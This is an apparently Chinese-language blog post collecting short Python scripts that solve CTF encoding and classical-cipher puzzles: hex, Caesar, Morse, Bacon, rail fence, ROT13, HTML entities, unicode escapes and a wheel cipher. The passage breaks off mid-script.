十六进制由0-9，A-F，组成。与10进制的对应关系是：0-9对应0-9；A-F对应10-15； 123456steady_str=&quot;flag&quot;steady_num=&quot;&quot;for i in steady_str: steady_num+=hex(ord(i))[2:]print(steady_num)666c6167 123456steady_str=&quot;ctf&quot;steady_num=&quot;&quot;for i in steady_str: steady_num+=hex(ord(i))[2:]print(steady_num)637466 同理 CTF–435446 FLAG–464c4147 常见的十六进制为： 1666C61677B68696464656E5F696E5F7468655F6D6964646C657D 关于二进制转十六进制四个二进制转化为一个六进制 1234steady_str=&quot;010100100110000101110010001000010001101000000111000000001100111110010000&quot;for i in range(0,len(steady_str),4): flag+=hex(int(steady_str[i:i+4],2))[2:]print(flag) ascii45对应ASCII”-“，42对应”*”，变成了-- *-- --* --* * *-* *--。莫斯密码。 凯撒密码原理凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。 下面我们总结一下： 明密对照表： 明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ 密文：TUVWXYZABCDEFGHIJKLMNOPQRS 注：广义上的凯撒是位移的。 凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙。 暴力破解 123456789101112131415161718192021222324str1 = &quot;oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;&quot;num = 26def steady(str=&quot;123&quot;,num=1): l = list(str) i = 0 while i &lt; len(l): if l[i]&gt;=&#x27;0&#x27; and l[i]&lt;=&#x27;9&#x27;: i = i+1 elif l[i]&gt;=&#x27;a&#x27; and l[i] &lt;=&#x27;z&#x27;: l[i]=chr(ord(&#x27;a&#x27;)+(ord(l[i])+num-ord(&#x27;a&#x27;))%26) i =i+1 elif l[i]&gt;=&#x27;A&#x27; and l[i] &lt;=&#x27;Z&#x27;: l[i]=chr(ord(&#x27;A&#x27;)+(ord(l[i])+num-ord(&#x27;A&#x27;))%26) i=i+1 else: i =i+1 ans = &quot;&quot;.join(l) return ansfor i in range(num): steady_str = steady(str1,i) print(steady_str) 每一位的移位数量不一样 12345678steady_str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;start=5flag=&quot;&quot;for i in range(len(steady_str)): print(steady_str[i]) flag+=chr(ord(steady_str[i])+start) start+=1print(flag) Task:I guess you are done with Caesar, aren’t you?The big problem with caesar is that it does not allow digits or other characters.I have fixed this, and now I can use any ascii character in the plaintext.The keyspace has increased from 26 to 128 too. \\o/ 123456789101112data2&#x3D;&quot;372332333823253030333b23282d2b2d38372333362333382c293623272c25362527382936370d232c253a29232a2d3c292823382c2d37232532282332333b230d23272532233937292325323d232537272d2d23272c25362527382936232d3223382c29233430252d3238293c382a30252b1e0e14073f3d33392336233b2d3241&quot;for i in range(128): flag&#x3D;&quot;&quot; for j in range(0,len(data2),2): string&#x3D;&quot;0x&quot; + data2[j:j+2] inting&#x3D;int(string,16)+i if inting &gt; 128: flag+&#x3D;chr(inting%128) else: flag+&#x3D;chr(inting) if &quot;ZJPC&quot; in flag: print(flag) 莫斯密码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556dict1 = &#123;&#x27;0&#x27;: &#x27;.&#x27;, &#x27;1&#x27;: &#x27;-&#x27;, &#x27; &#x27;: &#x27;/&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;steady_str1=&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;steady_str2=&quot;&quot;steady_str4=&quot;&quot;for i in steady_str1: steady_str2+=dict1[i]print(&quot;莫斯电码为：&quot;+steady_str2)for j in steady_str2: steady_str3=steady_str2.split(&#x27;/&#x27;)print(&quot;分割莫斯电码：&quot;)print(steady_str3)for z in steady_str3: steady_str4+=dict2[z]print(&quot;flag：&quot;+steady_str4) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758dict1 = &#123;&#x27;0&#x27;: &#x27;.&#x27;, &#x27;1&#x27;: &#x27;-&#x27;, &#x27; &#x27;: &#x27;/&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;steady_str=&quot;o00。o。o0oo。0o0o。000。00。o。0。000。ooo0。o。0o。oo0。ooo。0o0o。0。oo0o&quot;flag=&quot;&quot;for i in steady_str: if i==&#x27;o&#x27;: flag+=i.replace(&#x27;o&#x27;,&#x27;.&#x27;) elif i==&#x27;0&#x27;: flag+=i.replace(&#x27;0&#x27;,&#x27;-&#x27;) elif i==&#x27;。&#x27;: flag+=i.replace(&#x27;。&#x27;,&#x27; &#x27;)new_flag=&quot;&quot;flag=flag.split(&quot; &quot;)for i in flag: print(i) new_flag+=dict2[i]print(new_flag) ASCII编码1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 12345678910111213steady_str=&quot;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;&quot;steady_str1=steady_str.split(&#x27;;&#x27;)steady_str3=[]steady_flag=&quot;&quot;for i in steady_str1: try: steady_str2=i.split(&#x27;&amp;#&#x27;)[1] except: pass steady_str3.append(steady_str2)for i in steady_str3: steady_flag+=chr(int(i))print(steady_flag) 栏栅密码栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。 12345678910111213141516171819def fence(lst, numrails): fence = [[None] * len(lst) for n in range(numrails)] rails = range(numrails - 1) + range(numrails - 1, 0, -1) for n, x in enumerate(lst): fence[rails[n % len(rails)]][n] = x return [c for rail in fence for c in rail if c is not None]def encode(text, n): return &#x27;&#x27;.join(fence(text, n))def decode(text, n): rng = range(len(text)) pos = fence(rng, n) return &#x27;&#x27;.join(text[pos.index(n)] for n in rng)z = &quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;for i in range(2,10): y = decode(z,i) print y 培根密码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495import sysdef peig1(m): basic1 = &#123; &#x27;AAAAA&#x27; : &#x27;A&#x27;, &#x27;AAAAB&#x27; : &#x27;B&#x27;, &#x27;AAABA&#x27; : &#x27;C&#x27;, &#x27;AAABB&#x27; : &#x27;D&#x27;, &#x27;AABAA&#x27; : &#x27;E&#x27;, &#x27;AABAB&#x27; : &#x27;F&#x27;, &#x27;AABBA&#x27; : &#x27;G&#x27;, &#x27;AABBB&#x27; : &#x27;H&#x27;, &#x27;ABAAA&#x27; : &#x27;I&#x27;, &#x27;ABAAB&#x27; : &#x27;J&#x27;, &#x27;ABABA&#x27; : &#x27;K&#x27;, &#x27;ABABB&#x27; : &#x27;L&#x27;, &#x27;ABBAB&#x27; : &#x27;N&#x27;, &#x27;ABBBA&#x27; : &#x27;O&#x27;, &#x27;ABBBB&#x27; : &#x27;P&#x27;, &#x27;BAAAA&#x27; : &#x27;Q&#x27;, &#x27;BAAAB&#x27; : &#x27;R&#x27;, &#x27;BAABA&#x27; : &#x27;S&#x27;, &#x27;BAABB&#x27; : &#x27;T&#x27;, &#x27;BABAA&#x27; : &#x27;U&#x27;, &#x27;BABAB&#x27; : &#x27;V&#x27;, &#x27;BABBA&#x27; : &#x27;W&#x27;, &#x27;BABBB&#x27; : &#x27;X&#x27;, &#x27;BBAAA&#x27; : &#x27;Y&#x27;, &#x27;BBAAB&#x27; : &#x27;Z&#x27; &#125; output = &#x27;&#x27; for i in range(0, len(m) - 4, 5): temp = m[i: i + 5] output += basic1[temp] return outputdef peig2(m): basic2 = &#123; &#x27;AAAAA&#x27; : &#x27;A&#x27;, &#x27;AAAAB&#x27; : &#x27;B&#x27;, &#x27;AAABA&#x27; : &#x27;C&#x27;, &#x27;AAABB&#x27; : &#x27;D&#x27;, &#x27;AABAA&#x27; : &#x27;E&#x27;, &#x27;AABAB&#x27; : &#x27;F&#x27;, &#x27;AABBA&#x27; : &#x27;G&#x27;, &#x27;AABBB&#x27; : &#x27;H&#x27;, &#x27;ABAAA&#x27; : &#x27;I&#x27;, &#x27;ABAAA&#x27; : &#x27;J&#x27;, &#x27;ABAAB&#x27; : &#x27;K&#x27;, &#x27;ABABA&#x27; : &#x27;L&#x27;, &#x27;ABABB&#x27; : &#x27;M&#x27;, &#x27;ABBAA&#x27; : &#x27;N&#x27;, &#x27;ABBAB&#x27; : &#x27;O&#x27;, &#x27;ABBBA&#x27; : &#x27;P&#x27;, &#x27;ABBBB&#x27; : &#x27;Q&#x27;, &#x27;BAAAA&#x27; : &#x27;R&#x27;, &#x27;BAAAB&#x27; : &#x27;S&#x27;, &#x27;BAABA&#x27; : &#x27;T&#x27;, &#x27;BAABB&#x27; : &#x27;U&#x27;, &#x27;BAABB&#x27; : &#x27;V&#x27;, &#x27;BABAA&#x27; : &#x27;W&#x27;, &#x27;BABAB&#x27; : &#x27;X&#x27;, &#x27;BABBA&#x27; : &#x27;Y&#x27;, &#x27;BABBB&#x27; : &#x27;Z&#x27; &#125; output = &#x27;&#x27; for i in range(0, len(m) - 4, 5): temp = m[i: i + 5] output += basic2[temp] return outputif __name__ == &quot;__main__&quot;: m = &quot;aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba&quot; mode = 2 if len(m)%5 == 0: l = [] k = [] for i in xrange(len(m)/5): l.append(m[:5]) m = m[5:] if mode == 1: for i in l: if i.isupper(): k.append(peig1(i)) else: i = i.upper() k.append(peig1(i)) elif mode == 2: for i in l: if i.isupper(): k.append(peig2(i)) else: i = i.upper() k.append(peig2(i)) flag = &#x27;&#x27; for i in k: flag+=i[0] print(flag) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485dict1 = &#123;&#x27;aaaaa&#x27;:&#x27;a&#x27;, &#x27;aaaab&#x27;:&#x27;b&#x27;, &#x27;aaaba&#x27;:&#x27;c&#x27;, &#x27;aaabb&#x27;:&#x27;d&#x27;, &#x27;aabaa&#x27;:&#x27;e&#x27;, &#x27;aabab&#x27;:&#x27;f&#x27;, &#x27;aabba&#x27;:&#x27;g&#x27;, &#x27;aabbb&#x27;:&#x27;h&#x27;, &#x27;abaaa&#x27;:&#x27;i&#x27;, &#x27;abaab&#x27;:&#x27;j&#x27;, &#x27;ababa&#x27;:&#x27;k&#x27;, &#x27;ababb&#x27;:&#x27;l&#x27;, &#x27;abbaa&#x27;:&#x27;m&#x27;, &#x27;abbab&#x27;:&#x27;n&#x27;, &#x27;abbba&#x27;:&#x27;o&#x27;, &#x27;abbbb&#x27;:&#x27;p&#x27;, &#x27;baaaa&#x27;:&#x27;q&#x27;, &#x27;baaab&#x27;:&#x27;r&#x27;, &#x27;baaba&#x27;:&#x27;s&#x27;, &#x27;baabb&#x27;:&#x27;t&#x27;, &#x27;babaa&#x27;:&#x27;u&#x27;, &#x27;babab&#x27;:&#x27;v&#x27;, &#x27;babba&#x27;:&#x27;w&#x27;, &#x27;babbb&#x27;:&#x27;x&#x27;, &#x27;bbaaa&#x27;:&#x27;y&#x27;, &#x27;bbaab&#x27;:&#x27;z&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;enc_str0=&quot;--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-&quot;dec_str=&quot;&quot;enc_str2=&quot;&quot;enc_str1=enc_str0.split(&quot;/&quot;)for i in enc_str1: try: enc_str2 += dict2[i] except: passprint(enc_str2)enc_str2=enc_str2.split(&quot;hhhh&quot;)[1]for i in range(len(enc_str2)/5): dec_str += dict1[enc_str2[:5]] enc_str2=enc_str2[5:]print(dec_str) 云影密码8421BCD加密方式仅使用01248这5种数字来进行，其中0用来唯一表示间隔，其他数字用加法和表示替换密文。再使用数字126表示字母AZ。 12345678910111213steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_str=&quot;8842101220480224404014224202480122&quot;steady_str=steady_str.split(&quot;0&quot;)steady_flag=&quot;&quot;for i in steady_str: steady_sum=0 for j in i: steady_sum+=int(j) if steady_sum &gt; 26: steady_sum=steady_sum%26 print(steady_sum-1) steady_flag+=steady_dic[steady_sum-1]print(steady_flag) Rot13ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式： ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为 1，编码后变成6，以此类推顺序循环。 ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前 为B，编码后变成O，以此类推顺序循环。 ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。 ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47 位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用 于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。 1234567891011121314151617181920212223steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_dic1=&quot;abcdefghijklmnopqrstuvwxyz&quot;print(steady_dic1)steady_str=&quot;7=28LE9:D0&gt;2J092AA6?0:?0:?5FDEC:2=04@?EC@=06BF:A&gt;6?EN&quot;steady_flag=&quot;&quot;steady_num=13num=0for i in steady_str: if ord(&#x27;a&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;z&#x27;): num=steady_dic1.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic1[num-1] elif ord(&#x27;A&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;Z&#x27;): num=steady_dic.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic[num-1] else: steady_flag+=iprint(steady_flag) unicode编码1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 1\\u606d\\u559c\\u60a8\\uff01\\u006b\\u0065\\u0079\\u007b\\u0074\\u0068\\u0065\\u0020\\u0066\\u0069\\u0072\\u0073\\u0074\\u0020\\u006b\\u0065\\u0079\\u007d 以上编码都是unicode编码，都可以使用工具来解密。 轮转机加密123456789101112131415161718192021import resteady_str=&#x27;&#x27;&#x27;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&#x27;&#x27;&#x27;steady_content=re.findall(r&#x27;&lt;(.*?)&lt;&#x27;,steady_str)steady_vi=[2,3,7,5,13,12,9,1,8,10,4,11,6]steady_m=&quot;NFQKSEVOQOFNP&quot;steady_new_content=[]steady_new_content2=[None for k in range(13)]steady_vi2=[]for i in range(len(steady_vi)): steady_move=steady_vi[i] steady_new_content.append(steady_content[steady_move-1])for j in range(len(steady_new_content)): steady_vi2.append(steady_new_content[j].index(steady_m[j]))for x,y in enumerate(steady_new_content): steady_new_content2[x]=re.sub(r&quot; &quot;,&quot;&quot;,y[steady_vi2[x]:]+y[:steady_vi2[x]])for i in range(26): steady_flag=&quot;&quot; for j in range(13): steady_flag+=steady_new_content2[j][i] print(steady_flag) 123456789101112131415161718192021222324252627282930mtable = &quot;&quot;&quot;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9: &lt; 